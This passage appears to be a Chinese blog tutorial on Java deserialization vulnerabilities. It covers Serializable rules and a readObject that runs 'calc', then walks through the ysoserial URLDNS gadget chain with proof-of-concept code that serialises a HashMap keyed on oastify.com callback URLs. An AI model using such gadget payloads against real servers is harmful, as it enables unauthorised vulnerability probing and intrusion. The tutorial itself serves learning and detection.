ByteArrayInputStream 读取出来然后转化为指定的对象即可。<br><img src="/img/java%E5%AE%89%E5%85%A8/a08.png"></p><h4 id="1-序列化类的属性没有实现-Serializable-那么在序列化就会报错"><a href="#1-序列化类的属性没有实现-Serializable-那么在序列化就会报错" class="headerlink" title="1. 序列化类的属性没有实现 Serializable 那么在序列化就会报错"></a>1. 序列化类的属性没有实现 Serializable 那么在序列化就会报错</h4><p>在Person类中删去此接口</p><p><img src="/img/java%E5%AE%89%E5%85%A8/a09.png"></p><p>运行序列化代码时发现报错</p><p><img src="/img/java%E5%AE%89%E5%85%A8/a10.png"></p><h4 id="2-在反序列化过程中，它的父类如果没有实现序列化接口，那么将需要提供无参构造函数来重新创建对象。"><a href="#2-在反序列化过程中，它的父类如果没有实现序列化接口，那么将需要提供无参构造函数来重新创建对象。" class="headerlink" title="2. 在反序列化过程中，它的父类如果没有实现序列化接口，那么将需要提供无参构造函数来重新创建对象。"></a>2. 在反序列化过程中，它的父类如果没有实现序列化接口，那么将需要提供无参构造函数来重新创建对象。</h4><p>eg.</p><p>Animal 是父类，它没有实现 Serilizable 接口</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Animal</span> &#123;<br>    <span class="hljs-keyword">private</span> String color;<br> <br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Animal</span><span class="hljs-params">()</span> &#123;<span class="hljs-comment">//没有无参构造将会报错</span><br>        System.out.println(<span class="hljs-string">&quot;调用 Animal 无参构造&quot;</span>);<br>    &#125;<br> <br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Animal</span><span class="hljs-params">(String color)</span> &#123;<br>        <span class="hljs-built_in">this</span>.color = color;<br> <br>            System.out.println(<span class="hljs-string">&quot;调用 Animal 有 color 参数的构造&quot;</span>);<br>    &#125;<br> <br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Animal&#123;&quot;</span> +<br>                <span class="hljs-string">&quot;color=&#x27;&quot;</span> + color + <span class="hljs-string">&#x27;\&#x27;&#x27;</span> +<br>                <span class="hljs-string">&#x27;&#125;&#x27;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>BlackCat 是 Animal 的子类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">BlackCat</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Animal</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">long</span> <span class="hljs-variable">serialVersionUID</span> <span class="hljs-operator">=</span> <span class="hljs-number">1L</span>;<br>    <span class="hljs-keyword">private</span> String name;<br> <br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">BlackCat</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-built_in">super</span>();<br>        System.out.println(<span class="hljs-string">&quot;调用黑猫的无参构造&quot;</span>);<br>    &#125;<br> <br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">BlackCat</span><span class="hljs-params">(String color, String name)</span> &#123;<br>        <span class="hljs-built_in">super</span>(color);<br>        <span class="hljs-built_in">this</span>.name = name;<br>        System.out.println(<span class="hljs-string">&quot;调用黑猫有 color 参数的构造&quot;</span>);<br>    &#125;<br> <br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;BlackCat&#123;&quot;</span> +<br>                <span class="hljs-string">&quot;name=&#x27;&quot;</span> + name + <span class="hljs-string">&#x27;\&#x27;&#x27;</span> +<span class="hljs-built_in">super</span>.toString() +<span class="hljs-string">&#x27;\&#x27;&#x27;</span> +<br>                <span class="hljs-string">&#x27;&#125;&#x27;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>SuperMain 测试类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SuperMain</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">FILE_PATH</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;./super.bin&quot;</span>;<br> <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        serializeAnimal();<br>        deserializeAnimal();<br>    &#125;<br> <br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serializeAnimal</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">BlackCat</span> <span class="hljs-variable">black</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BlackCat</span>(<span class="hljs-string">&quot;black&quot;</span>, <span class="hljs-string">&quot;我是黑猫&quot;</span>);<br>        System.out.println(<span class="hljs-string">&quot;序列化前：&quot;</span>+black.toString());<br>        System.out.println(<span class="hljs-string">&quot;=================开始序列化================&quot;</span>);<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(FILE_PATH));<br>        oos.writeObject(black);<br>        oos.flush();<br>        oos.close();<br>    &#125;<br> <br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">deserializeAnimal</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        System.out.println(<span class="hljs-string">&quot;=================开始反序列化================&quot;</span>);<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(FILE_PATH));<br>        <span class="hljs-type">BlackCat</span> <span class="hljs-variable">black</span> <span class="hljs-operator">=</span> (BlackCat) ois.readObject();<br>        ois.close();<br>        System.out.println(black);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>输出结果</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java">调用 Animal 有 color 参数的构造<br>调用黑猫有 color 参数的构造<br>序列化前：BlackCat&#123;name=<span class="hljs-string">&#x27;我是黑猫&#x27;</span>Animal&#123;color=<span class="hljs-string">&#x27;black&#x27;</span>&#125;<span class="hljs-string">&#x27;&#125;</span><br><span class="hljs-string">=================开始序列化================</span><br><span class="hljs-string">=================开始反序列化================</span><br><span class="hljs-string">调用 Animal 无参构造</span><br><span class="hljs-string">BlackCat&#123;name=&#x27;</span>我是黑猫<span class="hljs-string">&#x27;Animal&#123;color=&#x27;</span><span class="hljs-literal">null</span><span class="hljs-string">&#x27;&#125;&#x27;</span>&#125;<br></code></pre></td></tr></table></figure><p>如果要序列化的对象的父类 Animal 没有实现序列化接口，那么在反序列化时是会调用对应的无参构造方法的，这样做的目的是重新初始化父类的属性，例如 Animal 因为没有实现序列化接口，因此对应的 color 属性就不会被序列化，因此反序列得到的 color 值就为 null。</p><h4 id="3-一个实现-Serializable-接口的子类也是可以被序列化的。"><a href="#3-一个实现-Serializable-接口的子类也是可以被序列化的。" class="headerlink" title="3. 一个实现 Serializable 接口的子类也是可以被序列化的。"></a>3. 一个实现 Serializable 接口的子类也是可以被序列化的。</h4><h4 id="4-静态成员变量是不能被序列化"><a href="#4-静态成员变量是不能被序列化" class="headerlink" title="4.静态成员变量是不能被序列化"></a>4.静态成员变量是不能被序列化</h4><p>序列化是针对对象属性的，而静态成员变量是属于类的。</p><h4 id="5-transient-标识的对象成员变量不参与序列化"><a href="#5-transient-标识的对象成员变量不参与序列化" class="headerlink" title="5.transient 标识的对象成员变量不参与序列化"></a>5.transient 标识的对象成员变量不参与序列化</h4><p><code>transient</code> 是 Java 里的 <strong>关键字</strong>，用来告诉 JVM：</p><blockquote><p><strong>这个字段在序列化时不要保存它的值</strong>。</p></blockquote><p>当你用 <code>ObjectOutputStream</code> 去序列化一个对象时，正常情况下<strong>所有的非 <code>static</code> 成员变量</strong>都会被写进序列化数据里。<br> 但是被 <code>transient</code> 修饰的字段会被<strong>跳过</strong>，反序列化时会用默认值（数字是 0，布尔是 false，对象是 null）。</p><h2 id="为什么会产生序列化的安全问题"><a href="#为什么会产生序列化的安全问题" class="headerlink" title="为什么会产生序列化的安全问题"></a>为什么会产生序列化的安全问题</h2><ul><li>序列化与反序列化当中有两个 <strong>“特别特别特别特别特别”</strong> 重要的方法 ———— <code>writeObject</code> 和 <code>readObject</code>。</li></ul><p>这两个方法可以经过开发者重写，一般序列化的重写都是由于下面这种场景诞生的。</p><blockquote><p>举个例子，MyList 这个类定义了一个 arr 数组属性，初始化的数组长度为 100。在实际序列化时如果让 arr 属性参与序列化的话，那么长度为 100 的数组都会被序列化下来，但是我在数组中可能只存放 30 个数组而已，这明显是不可理的，所以这里就要自定义序列化过程啦，具体的做法是重写以下两个 private 方法：</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">writeObject</span><span class="hljs-params">(java.io.ObjectOutputStream s)</span><span class="hljs-keyword">throws</span> java.io.IOException<br><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(java.io.ObjectInputStream s)</span><span class="hljs-keyword">throws</span> java.io.IOException, ClassNotFoundException<br></code></pre></td></tr></table></figure><p>只要服务端反序列化数据，客户端传递类的 <code>readObject</code> 中代码会自动执行，基于攻击者在服务器上运行代码的能力。</p><blockquote><p>所以从根本上来说，Java 反序列化的漏洞的与 <code>readObject</code> 有关。</p></blockquote><h3 id="可能存在安全漏洞的形式"><a href="#可能存在安全漏洞的形式" class="headerlink" title="可能存在安全漏洞的形式"></a>可能存在安全漏洞的形式</h3><h4 id="1-入口类的-readObject-直接调用危险方法"><a href="#1-入口类的-readObject-直接调用危险方法" class="headerlink" title="(1) 入口类的 readObject 直接调用危险方法"></a>(1) 入口类的 <code>readObject</code> 直接调用危险方法</h4><p>eg.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(ObjectInputStream ois)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException&#123;<br>    ois.defaultReadObject();<br>    Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>UnserializeTest.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> src;<br><br><span class="hljs-keyword">import</span> java.io.FileInputStream;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UnserializeTest</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String Filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException&#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">Person</span> <span class="hljs-variable">person</span> <span class="hljs-operator">=</span> (Person)unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br>        System.out.println(person);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>先运行序列化程序 —— “<strong>SerializationTest.java</strong>“，再运行反序列化程序 —— “<strong>UnserializeTest.java</strong>“</p><p>在反序列化时就会触发类文件中自定义的readObject方法，弹出计算器</p><p>但是这种情况几乎不会出现</p><h4 id="2-入口参数中包含可控类，该类有危险方法，readObject-时调用"><a href="#2-入口参数中包含可控类，该类有危险方法，readObject-时调用" class="headerlink" title="(2) 入口参数中包含可控类，该类有危险方法，readObject 时调用"></a>(2) 入口参数中包含可控类，该类有危险方法，<code>readObject</code> 时调用</h4><h4 id="3-入口类参数中包含可控类，该类又调用其他有危险方法的类，readObject-时调用"><a href="#3-入口类参数中包含可控类，该类又调用其他有危险方法的类，readObject-时调用" class="headerlink" title="(3) 入口类参数中包含可控类，该类又调用其他有危险方法的类，readObject 时调用"></a>(3) 入口类参数中包含可控类，该类又调用其他有危险方法的类，<code>readObject</code> 时调用</h4><h4 id="4-构造函数-静态代码块等类加载时隐式执行"><a href="#4-构造函数-静态代码块等类加载时隐式执行" class="headerlink" title="(4) 构造函数&#x2F;静态代码块等类加载时隐式执行"></a>(4) 构造函数&#x2F;静态代码块等类加载时隐式执行</h4><h3 id="产生漏洞的攻击路线"><a href="#产生漏洞的攻击路线" class="headerlink" title="产生漏洞的攻击路线"></a>产生漏洞的攻击路线</h3><p>首先的攻击前提：继承 Serializable</p><p>入口类：source （重写 readObject 调用常见的函数；参数类型宽泛，比如可以传入一个类作为参数；最好 jdk 自带）</p><p>找到入口类之后要找调用链 gadget chain 相同名称、相同类型</p><p>执行类 sink （RCE SSRF 写文件等等）比如 <code>exec</code> 这种函数</p><h4 id="以-HashMap-为例说明一下，仅仅只是说明如何找到入门类"><a href="#以-HashMap-为例说明一下，仅仅只是说明如何找到入门类" class="headerlink" title="以 HashMap 为例说明一下，仅仅只是说明如何找到入门类"></a>以 HashMap 为例说明一下，仅仅只是说明如何找到入门类</h4><p>首先，攻击前提，那必然是要继承了 <code>Serializable</code> 这个接口</p><p>可以看到HashMap 确实继承了 <code>Serializable</code> 这个接口。</p><p><img src="/img/java%E5%AE%89%E5%85%A8/a11.png"></p><p>寻找入口类</p><p>使用”结构”功能可以快速查看类中方法，找到重写的readObject类</p><p><img src="/img/java%E5%AE%89%E5%85%A8/a12.png"></p><p>我们看到第 1416 行与 1418 行中，Key 与 Value 的值执行了 <code>readObject</code> 的操作</p><p><img src="/img/java%E5%AE%89%E5%85%A8/a13.png"></p><p>调用的这个readObject()是ObjectInputStream类的方法，从这里可以看出，我们在属性类中重写的readObject只是对属性反序列化处理的大概步骤，或者说是框架，详细的反序列化还是要交给ObjectInputStream的readObject去完成的</p><p>继续跟进</p><p>可以看到利用<code>s.readObject</code>读取到key后，调用 <code>hash(key)</code> 计算哈希值</p><p><img src="/img/java%E5%AE%89%E5%85%A8/a14.png"></p><ul><li>若传入的参数 key 不为空，则 <code>h = key.hashCode()</code>，于是乎，继续跟进 <code>hashCode</code> 当中。</li></ul><p>hashCode 位置处于 Object 类当中，满足我们调用常见的函数这一条件。</p><p><img src="/img/java%E5%AE%89%E5%85%A8/a15.png"></p><h2 id="实战-–-URLDNS"><a href="#实战-–-URLDNS" class="headerlink" title="实战 – URLDNS"></a>实战 – URLDNS</h2><p><code>URLDNS</code> 是ysoserial中利用链的一个名字，通常用于检测是否存在Java反序列化漏洞。该利用链具有如下特点：</p><ul><li>不限制jdk版本，使用Java内置类，对第三方依赖没有要求</li><li>目标无回显，可以通过DNS请求来验证是否存在反序列化漏洞</li><li>URLDNS利用链，只能发起DNS请求，并不能进行其他利用</li></ul><p>ysoserial中列出的Gadget:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java">Gadget Chain:<br>HashMap.readObject()<br>HashMap.putVal()<br>HashMap.hash()<br>URL.hashCode()<br></code></pre></td></tr></table></figure><h3 id="初步复现"><a href="#初步复现" class="headerlink" title="初步复现"></a>初步复现</h3><p>URL 是由 HashMap 的 <code>put</code> 方法产生的，所以我们先跟进 <code>put</code> 方法当中。<code>put</code> 方法之后又是调用了 <code>hash</code> 方法；<code>hash</code> 方法则是调用了 <code>hashcode</code> 这一函数。</p><p><img src="/img/java%E5%AE%89%E5%85%A8/a16.png"></p><p>可以看到key.hashCode，key是hash方法传入的参数，我们可以控制key的值</p><p><img src="/img/java%E5%AE%89%E5%85%A8/a14.png"></p><p>此时调用的hashCode方法是Object类中的方法</p><p>攻击路线中 找到入口类之后要找调用链 gadget chain 相同名称、相同类型</p><p>利用URL类中相同的方法名，使其调用到URL类中的hashCode方法</p><p>来到URL类中的hashCode方法</p><p><img src="/img/java%E5%AE%89%E5%85%A8/a17.png"></p><p>L 中的 <code>hashCode</code> 被 <code>handler</code> 这一对象所调用，<code>handler</code> 又是 <code>URLStreamHandler</code> 的抽象类。我们再去找 <code>URLStreamHandler</code> 的 <code>hashCode</code> 方法。</p><p><img src="/img/java%E5%AE%89%E5%85%A8/a18.png"></p><p>此方法中又调用了<code>getByName(host)</code>方法，它的作⽤是根据主机名，获取其 IP 地址，在⽹络上其实就是⼀次 DNS 查询。到这⾥就不必要再跟了。</p><p><img src="/img/java%E5%AE%89%E5%85%A8/a19.png"></p><p>u就是刚开始传入的参数key，所以传递参数为</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">hashmap.put(<span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-string">&quot;DNS生成的 URL，用dnslog就可以&quot;</span>),<span class="hljs-number">1</span>);<br><br><span class="hljs-comment">// 传进去两个参数，key = 前面那串网址，value = 1</span><br></code></pre></td></tr></table></figure><p>URLDNS 的Gadget</p><ol><li>HashMap-&gt;readObject()</li><li>HashMap-&gt;hash()</li><li>URL-&gt;hashCode()</li><li>URLStreamHandler-&gt;hashCode()</li><li>URLStreamHandler-&gt;getHostAddress()</li><li>InetAddress-&gt;getByName()</li></ol><h3 id="问题解决"><a href="#问题解决" class="headerlink" title="问题解决"></a>问题解决</h3><h4 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h4><p>在这里有一个需要注意的点</p><ul><li>我们的复现步骤：</li></ul><p><strong>SerializationTest.java</strong> </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> src;<br><br><span class="hljs-keyword">import</span> src.Person;<br><br><span class="hljs-keyword">import</span> java.io.FileOutputStream;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.ObjectOutput;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.net.URL;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SerializationTest</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oos.writeObject(obj);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Person</span> <span class="hljs-variable">person</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">&quot;aa&quot;</span>, <span class="hljs-number">22</span>);<br>        HashMap&lt;URL,Integer&gt; hashmap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;URL,Integer&gt;();<br>        hashmap.put(<span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-string">&quot;http://p1rqenbukfug86be3r4n202x9off36rv.oastify.com&quot;</span>), <span class="hljs-number">1</span>);<br>        serialize(hashmap);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>在运行序列化文件时就会收到DNS请求</p><p><img src="/img/java%E5%AE%89%E5%85%A8/a21.png"></p><p>原因是在运行SerializationTest代码时URLDNS链子除了开始时的readObject，其余会正常执行</p><p>这里要看到URL类中的hashCode方法，当 <code>hashCode</code> 的值不等于 -1 的时候，函数就会直接 <code>return hashCode</code> 而不执行 <code>hashCode = handler.hashCode(this);</code>。</p><p><img src="/img/java%E5%AE%89%E5%85%A8/a17.png"></p><p>而在URL类中hashCode设置的值就是-1</p><p><img src="/img/java%E5%AE%89%E5%85%A8/a20.png"></p><p>所以序列化时也会收到DNS请求</p><h4 id="解决"><a href="#解决" class="headerlink" title="解决"></a>解决</h4><p>为了测试是否有反序列化漏洞，让我们的视角不受干扰</p><p>可以利用反射修改hashCode的初始值</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 1. 创建URL对象（但不发起实际网络请求）</span><br><span class="hljs-type">URL</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-string">&quot;http://bl00nzimnnujskz418kboqxt9kfb30.oastify.com&quot;</span>);<br><span class="hljs-comment">// 2. 获取URL对象的Class对象</span><br><span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> url.getClass();<br><span class="hljs-comment">// 3. 获取URL类中的私有字段hashCode</span><br><span class="hljs-type">Field</span> <span class="hljs-variable">hashcodefile</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;hashCode&quot;</span>);<br><span class="hljs-comment">// 4. 解除私有字段的访问限制</span><br>hashcodefile.setAccessible(<span class="hljs-literal">true</span>);<br><span class="hljs-comment">// 5. 强行设置该URL对象的hashCode值为1234</span><br>hashcodefile.set(url, <span class="hljs-number">1234</span>);<br><span class="hljs-comment">// 6. 将URL对象作为Key放入HashMap</span><br>hashmap.put(url, <span class="hljs-number">1</span>);<br><span class="hljs-comment">// 7. 再次通过反射将hashCode改回-1（触发重新计算的状态）</span><br>hashcodefile.set(url, -<span class="hljs-number">1</span>);<br><span class="hljs-comment">// 8. 序列化这个HashMap</span><br>serialize(hashmap);<br></code></pre></td></tr></table></figure><p>URLDNS 反序列化利用链的 POC</p><p>根据我们的思路，将 Main 函数进行修改</p><p><strong>SerializationTest.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;  <br> <span class="hljs-type">Person</span> <span class="hljs-variable">person</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">&quot;aa&quot;</span>,<span class="hljs-number">22</span>);  <br> HashMap&lt;URL,Integer&gt; hashmap= <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;URL,Integer&gt;();  <br> <span class="hljs-comment">// 这里不要发起请求  </span><br> <span class="hljs-type">URL</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-string">&quot;http://bl00nzimnnujskz418kboqxt9kfb30.oastify.com&quot;</span>); <br> <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> url.getClass();  <br> <span class="hljs-type">Field</span> <span class="hljs-variable">hashcodefile</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;hashCode&quot;</span>);  <br> hashcodefile.setAccessible(<span class="hljs-literal">true</span>);  <br> hashcodefile.set(url,<span class="hljs-number">1234</span>);  <br> hashmap.put(url,<span class="hljs-number">1</span>);  <br> <span class="hljs-comment">// 这里把 hashCode 改为 -1； 通过反射的技术改变已有对象的属性  </span><br> hashcodefile.set(url,-<span class="hljs-number">1</span>);  <br> serialize(hashmap);  <br>&#125;<br></code></pre></td></tr></table></figure><p>这样运行反序列化后就只能收到反序列化时发出的请求</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a 